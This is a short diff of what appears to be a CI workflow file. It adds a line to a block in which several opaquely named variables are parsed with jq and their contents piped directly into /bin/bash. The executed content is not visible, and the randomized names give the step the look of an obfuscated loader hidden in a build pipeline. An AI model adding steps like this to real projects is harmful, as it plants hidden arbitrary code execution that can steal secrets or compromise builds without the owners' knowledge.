@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$a36" | jq -r .xlh8 | /bin/bash
           echo $oou9018 | jq -r .xesue8 | /bin/bash
           printf '%s' "$j8" | jq -r .p7643 | /bin/bash
+          printf '%s' "$py10527" | jq -r .jk39495 | /bin/bash
 
       - name: Archive results
         if: always()
